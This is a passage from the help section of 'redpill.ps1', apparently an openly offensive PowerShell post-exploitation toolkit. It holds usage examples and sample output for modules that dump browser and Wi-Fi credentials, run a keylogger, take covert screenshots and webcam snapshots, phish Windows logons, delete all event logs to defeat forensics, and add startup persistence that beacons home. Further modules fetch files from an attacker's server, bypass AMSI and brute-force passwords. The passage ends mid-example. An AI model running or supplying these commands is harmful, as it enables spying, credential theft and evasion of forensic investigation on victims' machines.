## --------------------------------------------------------------
##       HELP =>  * PARAMETERS DETAILED DESCRIPTION *
## --------------------------------------------------------------


If($Help -ieq "sysinfo"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerates remote host basic system info

   .DESCRIPTION
      System info: IpAddress, OsVersion, OsFlavor, OsArchitecture,
      WorkingDirectory, CurrentShellPrivileges, ListAllDrivesAvailable
      PSCommandLogging, AntiVirusDefinitions, AntiSpywearDefinitions,
      UACsettings, WorkingDirectoryDACL, BehaviorMonitorEnabled, Etc..

   .NOTES
      Optional dependencies: curl (geolocation) icacls (file permissions)
      -HideMyAss "True" - Its used to hide the public ip address display!
      If sellected -sysinfo "verbose" then established & listening connections
      will be listed insted of list only the established connections (TCP|IPV4)

   .Parameter Sysinfo
      Accepts arguments: Enum, Verbose (default: Enum)

   .Parameter HideMyAss
      Accepts arguments: True, False (default: False)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SysInfo Enum
      Remote Host Quick Enumeration Module

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SysInfo Enum -HideMyAss True
      Remote Host Quick Enumeration Module (hide public ip addr display)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SysInfo Verbose
      Remote Host Detailed Enumeration Module

   .OUTPUTS
      PublicIP    city  region country  capital latitude longitude
      --------    ----  ------ -------  ------- -------- ---------
      3.382.13.77 Alges Lisbon Portugal Lisbon  38.7019  -9.2243

      Proto LocalAddress  LocalPort RemoteAdress    RemotePort ProcessName PID
      ----- ------------- --------- --------------- ---------- ----------- ---
      TCP   192.168.1.72  55062     35.165.138.131  443        firefox     8904
      TCP   192.168.1.72  55102     140.82.112.25   443        firefox     8904
      TCP   192.168.1.72  55846     51.138.106.75   443        svchost     1636
      TCP   192.168.1.72  55847     34.117.59.81    80         powershell  1808
      TCP   192.168.1.72  60406     20.54.37.64     443        svchost     8352
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetDnsCache"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate remote host DNS cache entrys

   .Parameter GetDnsCache
      Accepts arguments: Enum, Clear (default: Enum)
      
   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetDnsCache Enum
      Enumerate ALL dns cache entrys

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetDnsCache Clear
      Clear Dns Cache entrys {delete all entrys}

   .OUTPUTS
      TTL Entry              Name                         Data                              
      --- -----              ----                         ----                              
      158 www.gstatic.com    www.gstatic.com              142.250.184.163                   
      158 www.gstatic.com    ns2.google.com               216.239.34.10
      13  www.facebook.com   www.facebook.com             star-mini.c10r.facebook.com       
      13  www.facebook.com   star-mini.c10r.facebook.com  69.171.250.35                     
      13  www.facebook.com   d.ns.c10r.facebook.com       185.89.219.11
      56  www.messenger.com  a.ns.c10r.facebook.com       129.134.30.11
      225 www.youtube.com    ns1.google.com               2001:4860:4802:32::a  
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetConnections"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Gets a list of ESTABLISHED TCP connections!
   
   .DESCRIPTION
      Enumerates ESTABLISHED UDP\TCP connections and retrieves the
      Process Name associated from the connection PID (Id) identifier.

   .Parameter GetConnections
      Accepts arguments: Enum, Verbose (default: Enum)

   .Parameter Query
      Search particular string in connections (default: false)

   .Parameter LogFile
      The path\name.log of the logfile to create (default: false)
    
   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetConnections Enum
      Enumerates ESTABLISHED TCP connections only! (IPv4)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetConnections Verbose
      Enumerates LISTENNING\ESTABLISHED UDP\TCP connections! (IPv4)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetConnections Enum -Query "13.225.245.57:443"
      Search for '13.225.245.57:443' string in ESTABLISHED TCP connections! (IPv4)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetConnections Verbose -LogFile "`$Env:TMP\testme.log"
      Enumerates All LISTENNING\ESTABLISHED UDP\TCP connections and store results on testme.log

   .OUTPUTS
      Proto LocalAddress  LocalPort RemoteAdress    RemotePort ProcessName PID   State      
      ----- ------------- --------- --------------- ---------- ----------- ---   -----      
      TCP   192.168.1.72  50776     13.225.245.57   443        opera       14492 ESTABLISHED
      TCP   192.168.1.72  53139     142.250.201.80  443        svchost     7280  ESTABLISHED
      TCP   192.168.1.72  55941     20.54.37.64     443        svchost     13224 ESTABLISHED
      TCP   192.168.1.72  56650     2.16.65.56      443        opera       14492 ESTABLISHED
      TCP   192.168.1.72  63127     35.185.44.232   443        opera       14492 ESTABLISHED
      TCP   192.168.1.72  63395     40.115.117.93   443        MsMpEng     3512  ESTABLISHED
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetInstalled"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - List remote host applications installed

   .DESCRIPTION
      Enumerates appl installed and respective versions

   .Parameter GetInstalled
      Accepts argument: Enum

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetInstalled Enum

   .OUTPUTS
      DisplayName                        DisplayVersion  Publisher                    InstallDate
      -----------                        --------------  ---------                    -----------
      ASUS GIFTBOX                       6.6.10          ASUSTek Computer Inc                    
      Battle.net                                         Blizzard Entertainment                                                                                                                              
      Realtek PCI-E Wireless LAN Driver  Drv_3.00.0008   REALTEK Semiconductor Corp.  20170718   
      WPS Office for ASUS                10.1.0.5644     Kingsoft Corp.                          
      Microsoft Edge                     92.0.902.62     Microsoft Corporation        20210731   
      Microsoft Edge Update              1.3.147.37                                                  
      Microsoft Edge WebView2 Runtime    92.0.902.62     Microsoft Corporation        20210731   
      Resource Hacker Version 5.1.7                                                   20210312   
      StarCraft II                                       Blizzard Entertainment                  
      TeamViewer 11                      11.0.59518      TeamViewer        
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetProcess" -or $Help -ieq "ProcessName"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
     Author: @r00t-3xp10it
     Helper - Enumerate/Kill running process/Tokens

   .DESCRIPTION
      This CmdLet enumerates 'All' running process if used
      only the 'Enum' @arg IF used -ProcessName parameter
      then cmdlet 'kill' or 'enum' the sellected processName.

   .NOTES
      -GetProcess 'Tokens' @argument requires Admin privileges
      -GetProcess 'Enum' excludes from query 'Idle,svchost,RunTimeBroker' 

   .Parameter GetProcess
      Accepts arguments: Enum, Kill and Tokens (default: Enum)

   .Parameter ProcessName
      The Process name to query or kill (default: false)

   .Parameter Verb
      Display process loaded dll's modules! (default: false)

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Enum
      Enumerate ALL Remote Host Running Processes

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Enum -ProcessName firefox.exe
      Enumerate firefox { Id,Name,ProcessName,Description,StartTime,Version,Path,.. }

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Enum -ProcessName firefox -Verb True
      Enumerate ALL instances of firefox process and loaded dll's modules!

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Kill -ProcessName firefox.exe
      Kill Remote Host firefox.exe Running Process

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Tokens
      Enum ALL user process tokens and queries them for details

   .OUTPUTS
      Id   Name                  ProductVersion    StartTime            Description
      --   ----                  --------------    ---------            ----------- 
      8524 ACMON                 1, 0, 0, 0        17/07/2021 22:01:19  ACMON                                      
      1724 ApplicationFrameHost  10.0.19041.746    17/07/2021 21:59:30  Application Frame Host                     
      7904 AsusTPLoader          1.0.51.0          17/07/2021 21:59:12  ASUS Smart Gesture Loader
      5092 dllhost               10.0.19041.546    17/07/2021 21:58:53  COM Surrogate
      9300 HxOutlook             16.0.13426.20910  17/07/2021 23:01:51  Microsoft Outlook
      4416 WinStore.App          0.0.0.0           17/07/2021 22:02:51  Store 
      6272 YourPhone             1.21052.124.0     17/07/2021 21:58:36  YourPhone
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetTasks" -or $Help -ieq "TaskName" -or $Help -ieq "Interval" -or $Help -ieq "Exec"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate\Create\Delete schedule tasks!

   .DESCRIPTION
      This module enumerates host ready\running tasks,
      creates new task Or delete existing schedule task.

   .NOTES
      Created tasks have the default duration of 12 hours.
      Remark: Dont leave empty spaces in -TaskName '<string>'
      declaration when creating a new task with this cmdlet.

   .Parameter GetTasks
      Accepts arguments: Enum, Create, Delete (default: Enum)

   .Parameter TaskName
      The Task Name to Query, Create or to Kill (default: false)

   .Parameter Interval
      The interval time (in minuts) to run the task (default: 1)

   .Parameter Exec
      The cmdline\appl to be executed by the task (default: false)

   .Parameter Persiste
      Execute the created schedule task at startup? (default: false)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetTasks Enum
      Enumerate running\ready schedule tasks!

   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetTasks Enum -TaskName "CDSSync"
      Enumerate only 'CDSSync' task detailed information!

   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetTasks Create -TaskName "mytask" -Interval 10 -Exec "cmd /c start calc.exe"
      Creates the taskname 'mytask' that executes 'calc.exe' with 10 minuts of interval (loop) for 12 hours!

   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetTasks Create -TaskName "myTask" -Exec "cmd.exe" -Interval 2 -Persiste True
      Creates the taskname 'myTask' that executes 'cmd.exe' at STARTUP with 2 minuts of interval! (loop)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetTasks Delete -TaskName "mytask"
      Delete\Kill 'mytask' task name

   .OUTPUTS
      TaskName                                 Next Run Time          Status
      --------                                 -------------          ------
      mytask                                   24/01/2021 17:43:44    Running
      ASUS Smart Gesture Launcher              N/A                    Ready          
      CreateExplorerShellUnelevatedTask        N/A                    Ready          
      OneDrive Standalone Update Task-S-1-5-21 24/01/2021 17:43:44    Ready 
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetLogs" -or $Help -ieq "NewEst" -or $Help -ieq "Id"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate\Read\DeleteAll eventvwr logfiles!

   .DESCRIPTION
      This cmdlet allow users to delete ALL eventvwr logfiles or to delete
      all of the logfiles from the sellected categorie { -verb 'event path' }.
      It also enumerates major categories logfiles counter { -GetLogs 'Enum' }
      to help attacker identify if the logs have been successfuly deleted. To
      further forensics investigation we can use the { -GetLogs 'yara' } @arg
      that allow users to display the contents of the sellected logfiles.

   .NOTES
      Required Dependencies: wevtutil {native}
      To list multiple Id's then split the numbers by a [,] char!
      Example: .\GetLogs.ps1 -GetLogs Yara -Id "59,60,300,400,8002"
      If none -ID or -VERB paramets are used together with 'YARA' @argument,
      then this cmdlet will start scan pre-defined event paths and ID's numbers!

   .Parameter GetLogs
      Accepts argument: Enum, Verbose, Yara, DeleteAll (default: Enum)

   .Parameter NewEst
      How many event logs to display int value (default: 3)

   .Parameter Id
      List logfiles by is EventID number identifier!

   .Parameter Verb
      Accepts 'ONE' Eventvwr path to be scanned\Deleted! 

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Enum
      Lists Major eventvwr categorie entrys

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Verbose
      List newest 3 (default) Powershell\Application\System entrys!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Verbose -NewEst 8
      List newest 8 Eventvwr Powershell\Application\System entrys!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Yara -NewEst 28
      List newest 28 logs using cmdlet default Id's and categories!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Yara -NewEst 13 -Id 59
      List newest 13 logfiles with Id: 59 using cmdlet default categories!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Yara -verb "system" -Id 1 -NewEst 10
      List newest 10 logfiles of 'system' categorie with id: 1

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Yara -Verb "Microsoft-Windows-NetworkProfile/Operational" -id 10001
      List newest 3 (default) logfiles of 'NetworkProfile/Operational' categorie with Id: 10001

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs DeleteAll
      Delete ALL eventvwr (categories) logs from snapIn!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs DeleteAll -Verb "Microsoft-Windows-Powershell/Operational"
      Delete ONLY logfiles from "Microsoft-Windows-Powershell/Operational" eventvwr categorie!

   .OUTPUTS
      LogMode  MaximumSizeInBytes RecordCount LogName
      -------  ------------------ ----------- -------
      Circular           15728640        3978 Windows PowerShell
      Circular           20971520        1731 System
      Circular            1052672           0 Internet Explorer
      Circular           20971520        1122 Application
      Circular            1052672        1729 Microsoft-Windows-WMI-Activity/Operational
      Circular            1052672         520 Microsoft-Windows-Windows Defender/Operational
      Circular           15728640         719 Microsoft-Windows-PowerShell/Operational
      Circular            1052672         499 Microsoft-Windows-Bits-Client/Operational
      Circular            1052672           0 Microsoft-Windows-AppLocker/EXE and DLL
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetBrowsers"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Leak Installed Browsers Information

   .NOTES
      This module downloads GetBrowsers.ps1 from venom
      GitHub repository into remote host %TMP% directory,
      And identify install browsers and run enum modules.

   .Parameter GetBrowsers
      Accepts arguments: Enum, Verbose and Creds (default: Enum)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetBrowsers Enum
      Identify installed browsers and is version numbers

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetBrowsers Verbose
      Run enumeration modules againts ALL installed browsers found

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetBrowsers Creds
      Dump Stored credentials from ALL installed browsers found

   .OUTPUTS
      Browser   Install   Status   Version         PreDefined
      -------   -------   ------   -------         ----------
      IE        Found     Stoped   9.11.18362.0    False
      CHROME    False     Stoped   {null}          False
      FIREFOX   Found     Stoped   81.0.2          False
      OPERA GX  Found     Active   78.0.4093.186   True
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Screenshot" -or $Help -ieq "Delay"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Capture remote desktop screenshot(s)

   .DESCRIPTION
      This module can be used to take only one screenshot
      or to spy target user activity using -Delay parameter.

   .Parameter Screenshot
      Accepts how many screenshot to be taken (default: 1)

   .Parameter Delay
      Accepts the delay time (sec) between each capture (default: 1)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Screenshot 1
      Capture 1 desktop screenshot and store it on %TMP%.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Screenshot 5 -Delay 8
      Capture 5 desktop screenshots with 8 secs delay between captures.

   .OUTPUTS
      ScreenCaptures Delay  Storage                          
      -------------- -----  -------                          
      1              1(sec) C:\Users\pedro\AppData\Local\Temp
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Camera"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @tedburke | @r00t-3xp10it
      Helper - List computer webcam device names or capture snapshot

   .NOTES
      Remark: WebCam turns the ligth 'ON' taking snapshots.
      Using -Camera Snap @argument migth trigger AV detection
      Unless target system has powershell version 2 available.
      In that case them PS version 2 will be used to execute
      our binary file and bypass AV amsi detection.

   .Parameter Camera
      Accepts arguments: Enum and Snap (default: Enum)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Camera Enum
      List ALL WebCams Device Names available

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Camera Snap
      Take one screenshot using default camera

   .OUTPUTS
      StartTime ProcessName DeviceName           
      --------- ----------- ----------           
      17:32:23  CommandCam  USB2.0 VGA UVC WebCam
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "StartWebServer" -or $Help -ieq "SPort"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @MarkusScholtes | @r00t-3xp10it
      Helper - Start Local HTTP WebServer (Background)

   .NOTES
      Access WebServer: http://<RHOST>:8080/
      This module download's webserver.ps1 or Start-WebServer.ps1
      to remote host %TMP% and executes it on an hidden terminal prompt
      to allow users to silent browse/read/download files from remote host.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Python
      Downloads webserver.ps1 to %TMP% and executes the webserver.
      Remark: This Module uses Social Enginnering to trick remote host into
      installing python (python http.server) if remote host does not have it.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Python -SPort 8087
      Downloads webserver.ps1 and executes the webserver on port 8087

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Powershell
      Downloads Start-WebServer.ps1 and executes the webserver.
      Remark: This module uses UacMe (EOP) to elevate cmdlet privs to admin

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Powershell -SPort 8087
      Downloads Start-WebServer.ps1 and executes the webserver on port 8087
      Remark: This module uses UacMe (EOP) to elevate cmdlet privs to admin
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Upload" -or $Help -ieq "ApacheAddr" -or $Help -ieq "Destination"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Download files from attacker {apache2}

   .NOTES
      Required Attacker Dependencies: apache2 webroot
      Required Target Dependencies: BitsTransfer {native}
      File to Download must be stored in attacker apache2 webroot.

   .Parameter Upload
      Accepts the file name of file to be uploaded

   .Parameter ApacheAddr
      Accepts the attacker apache2 ip address

   .Parameter Destination
      Accepts the Absoluct \ relative path of file to upload storage (default: `$Env:TMP)

   .EXAMPLE
      Syntax : .\redpill.ps1 -Upload [ file.ps1 ] -ApacheAddr [ Attacker ] -Destination [ full\Path\file.ps1 ]
      Example: powershell -File redpill.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\FileName.ps1
      Download FileName.ps1 script from attacker apache2 (192.168.1.73) into `$Env:TMP\FileName.ps1 Local directory.
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Keylogger"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Capture remote host keystrokes {void}

   .DESCRIPTION
      This module start recording target system keystrokes
      in background mode and only stops if void.exe binary
      its deleted or is process {void.exe} its stoped.

   .NOTES
      Required Dependencies: void.exe {auto-download}

   .Parameter Keylogger
      Accepts arguments: Start and Stop

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Keylogger Start
      Start recording target system keystrokes

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Keylogger Stop
      Stop keylogger by is process FileName identifier and delete
      keylogger script and all respective files/logs left behind.

   .OUTPUTS
      StartTime ProcessName PID  LogFile                                   
      --------- ----------- ---  -------                                   
      17:37:17  void.exe    2836 C:\Users\pedro\AppData\Local\Temp\void.log
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Mouselogger" -or $Help -ieq "Timmer"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Capture screenshots of MouseClicks for 'xx' Seconds

   .DESCRIPTION
      This script allow users to Capture Screenshots of 'MouseClicks'.
      Remark: Capture will be stored under '`$Env:TMP' remote directory.
      'Min capture time its 8 secs the max is 300 and 100 screenshots'.

   .NOTES
      Required Dependencies: psr.exe {native}

   .Parameter MouseLogger
      Accepts argument: Start

   .Parameter Timmer
      The time used to record mouse clicks (default: 10)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Mouselogger Start
      Capture Screenshots of Mouse Clicks for 10 secs {default}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Mouselogger Start -Timmer 28
      Capture Screenshots of remote Mouse Clicks for 28 seconds

   .OUTPUTS
      Capture     Timmer      Storage                                          
      -------     ------      -------                                          
      MouseClicks for 10(sec) C:\Users\pedro\AppData\Local\Temp\SHot-zcsV03.zip
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "PhishCreds" -or $Help -ieq "Dicionary" -or $Help -ieq "Limmit"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @mubix | @r00t-3xp10it
      Helper - Promp the current user for a valid credential.

   .DESCRIPTION
      This CmdLet interrupts EXPLORER process until a valid credential is entered
      correctly in Windows PromptForCredential MsgBox, only them it starts EXPLORER
      process and leaks the credentials on this terminal shell (Social Engineering).

   .NOTES
      Remark: CredsPhish.ps1 CmdLet its set for 5 fail validations before abort.
      Remark: CredsPhish.ps1 CmdLet requires lmhosts + lanmanserver services running.
      Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.

   .Parameter PhishCreds
      Accepts arguments: Start and Brute (default: Start)

   .Parameter Limmit
      Aborts phishing after -Limmit 'fail attempts' reached.

   .Parameter Dicionary
      Accepts the absoluct \ relative path of dicionary.txt
      Remark: Optional parameter of -PhishCreds 'Brute'

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PhishCreds Start
      Prompt the current user for a valid credential.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PhishCreds Start -Limmit 30
      Prompt the current user for a valid credential and Abort phishing
      after -Limmit 'number' of fail attempts its reached.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PhishCreds Brute -Dicionary "`$Env:TMP\passwords.txt"
      Brute force user account using -Dicionary [ path ] text file

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PhishCreds Brute -Dicionary "`$Env:TMP\passwords.txt" -UserAccount testme
      Brute force 'testme' user account using -Dicionary [ path ] text file

   .OUTPUTS
      Captured Credentials (logon)
      ----------------------------
      TimeStamp : 01/17/2021 15:26:24
      username  : r00t-3xp10it
      password  : mYs3cr3tP4ss
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "EOP"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @_RastaMouse | @r00t-3xp10it
      Helper - Find Missing Software Patchs For Privilege Escalation

   .NOTES
      This Module does NOT exploit any EOP vulnerabitys found.
      It will 'report' them and display the exploit-db POC link.
      Remark: Attacker needs to manualy download\execute the POC.
      Sherlock.ps1 GitHub WIKI page: https://tinyurl.com/y4mxe29h

   .Parameter EOP
      Accepts arguments: Enum and Verbose (default: Enum)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -EOP Enum
      Scans GroupName Everyone and permissions (F)
      Unquoted Service vuln Paths, Dll-Hijack, etc.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -EOP Verbose
      Scans the Three Group Names and Permissions (F)(W)(M)
      And presents a more elaborate report with extra tests.

   .OUTPUTS
      Title      : TrackPopupMenu Win32k Null Point Dereference
      MSBulletin : MS14-058
      CVEID      : 2014-4113
      Link       : https://www.exploit-db.com/exploits/35101/
      VulnStatus : Appers Vulnerable
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Persiste" -or $Help -ieq "BeaconTime"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Persiste scripts using StartUp folder

   .DESCRIPTION
      This persistence module beacons home in sellected intervals defined
      by CmdLet User with the help of -BeaconTime parameter. The objective
      its to execute our script on every startup from 'xx' to 'xx' seconds.

   .NOTES
      Remark: Payload supported extensions: ps1|exe|py|vbs|bat
      Remark: Use double quotes if Path has any empty spaces in name.

   .Parameter Persiste
      Accepts arguments: Stop or Payload absoluct path

   .Parameter BeaconTime
      Accepts the interval time (sec) between each Payload execution

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Persiste Stop
      Stops wscript process (vbs) and delete persistence.vbs script
      Remark: This function stops the persiste.vbs from beacon home
      and deletes persiste.vbs Leaving our reverse tcp shell intact.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Persiste "`$Env:TMP\Payload.ps1"
      Execute Payload.ps1 at every StartUp with 10 sec of interval between each execution

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Persiste "`$Env:TMP\Payload.ps1" -BeaconTime 28
      Execute Payload.ps1 at every StartUp with 28 sec of interval between each execution

   .OUTPUTS
      Sherlock.ps1 Persistence Settings
      ---------------------------------
      BeaconHomeInterval : 10 (sec) interval
      ClientAbsoluctPath : C:\Users\pedro\AppData\Local\Temp\Sherlock.ps1
      PersistenceScript  : C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.vbs
      PersistenceScript  : Successfuly Created!
      wscriptProcStatus  : Stopped! {require SKYNET restart}
      OR the manual execution of Persiste.vbs script! {StartUp}
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "WifiPasswords" -or $Help -ieq "Storage"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump All SSID Wifi passwords

   .DESCRIPTION
      Module to dump SSID Wifi passwords into terminal windows
      OR dump credentials into a zip archive under `$Env:TMP

   .NOTES
      Required Dependencies: netsh {native}

   .Parameter WifiPasswords
      Accepts arguments: Dump and ZipDump (default: Dump)

   .Parameter Storage
      The directory path where to store the zip archive (default: %tmp%)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -WifiPasswords Dump
      Dump ALL Wifi Passwords on this terminal prompt

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -WifiPasswords ZipDump
      Dump Wifi Paswords into a Zip archive on %TMP% {default}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -WifiPasswords ZipDump -Storage `$Env:APPDATA
      Dump Wifi Paswords into a Zip archive on %APPDATA% remote directory

   .OUTPUTS
      SSID name               Password    
      ---------               --------               
      CampingMilfontesWifi    Milfontes19 
      NOS_Internet_Movel_202E 37067757                                             
      Ondarest                381885C874           
      MEO-968328              310E0CBA14
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "SpeakPrank" -or $Help -ieq "Rate" -or $Help -ieq "Volume"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Speak Prank {SpeechSynthesizer}

   .DESCRIPTION
      Make remote host speak user input sentence (prank)

   .NOTES
      Required Dependencies: SpeechSynthesizer {native}
      Remark: Double Quotes are Mandatory in @arg declarations
      Remark: -Volume controls the speach volume {default: 88}
      Remark: -Rate Parameter configs the SpeechSynthesizer speed

   .Parameter SpeakPrank
      Accepts the frase (string) to speak

   .Parameter Volume
      Accepts the speach volume (default: 88)

   .Parameter Rate
      Accepts the SpeechSynthesizer speed (default: 1)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SpeakPrank "Hello World"
      Make remote host speak "Hello World" using @redpill default settings

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SpeakPrank "Hello World" -Rate 5 -Volume 100

   .OUTPUTS
      RemoteHost SpeachSpeed Volume Speak        
      ---------- ----------- ------ -----        
      SKYNET     5           100    'hello world'
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "MsgBox" -or $Help -ieq "TimeOut" -or $Help -ieq "ButtonType"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Spawn a msgBox on local host {ComObject}

   .NOTES
      Required Dependencies: Wscript ComObject {native}
      Remark: Double Quotes are Mandatory in -MsgBox value
      Remark: -TimeOut '0' argument maintains the msgbox open.

      MsgBox Button Types
      -------------------
      0 - Show OK button. 
      1 - Show OK and Cancel buttons. 
      2 - Show Abort, Retry, and Ignore buttons. 
      3 - Show Yes, No, and Cancel buttons. 
      4 - Show Yes and No buttons. 
      5 - Show Retry and Cancel buttons. 

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MsgBox "Hello World."
      Spawns message box with @redpill default settings

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MsgBox "Hello World." -TimeOut 4
      Spawn message box and close msgbox after 4 seconds time {-TimeOut 4}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MsgBox "Hello World." -ButtonType 4
      Spawns message box with Yes and No buttons {-ButtonType 4}

   .OUTPUTS
      TimeOut  ButtonType           Message
      -------  ----------           -------
      5 (sec)  'Yes and No buttons' 'Hello World.'
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "BruteZip" -or $Help -ieq "PassList"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @securethelogs | @r00t-3xp10it
      Helper - Brute force ZIP archives {7z.exe}

   .DESCRIPTION
      This module brute forces ZIP archives with the help of 7z.exe
      It also downloads custom password list from @josh-newton GitHub
      Or accepts User dicionary if stored in `$Env:TMP\passwords.txt

   .NOTES
      Required Dependencies: 7z.exe {manual-install}
      Required Dependencies: `$Env:TMP\passwords.txt {auto|manual}
      Remark: Use double quotes if path contains any empty spaces.

   .Parameter BruteZip
      Accepts the absoluct \ relative path of zip archive to brute

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -BruteZip `$Env:USERPROFILE\Desktop\redpill.zip
